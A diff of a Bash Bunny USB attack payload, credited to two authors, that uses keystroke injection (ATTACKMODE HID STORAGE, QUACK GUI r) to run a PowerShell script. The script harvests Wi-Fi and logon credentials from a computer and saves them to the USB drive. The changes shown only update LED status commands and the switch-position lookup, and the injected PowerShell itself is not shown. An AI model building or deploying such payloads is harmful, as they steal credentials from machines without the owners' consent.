@@ -2,7 +2,7 @@
 # Author:        JWHeuver & JBaselier
 # Version:       1.0
 #
-# Runs powershell script to get Wlan and logon credentials 
+# Runs powershell script to get Wlan and logon credentials
 # from computer and save them on USB drive (Storage attack)
 #
 # Purple.............Loading
@@ -14,19 +14,18 @@
 # OPTIONS - More options available in the Powershell payload
 OBFUSCATECMD="N" # Y=yes or N=no
 
-# Source bunny_helpers.sh to get environment variable and switch_positions
-source bunny_helpers.sh
-
 #-----------------------------------
 # Purple LED - initializing
-LED R B 0
+LED SETUP
+
+GET SWITCH_POSITION
 
 # Attackmode HID / Storage
 ATTACKMODE HID STORAGE
 
 #-----------------------------------
 # Green LED - executing credential_powershell
-LED G 0
+LED STAGE1
 
 QUACK GUI r
 QUACK DELAY 300
@@ -57,4 +56,4 @@ QUACK ENTER
 
 #-----------------------------------
 # Kill the lights - finished
-LED 0
+LED FINISH
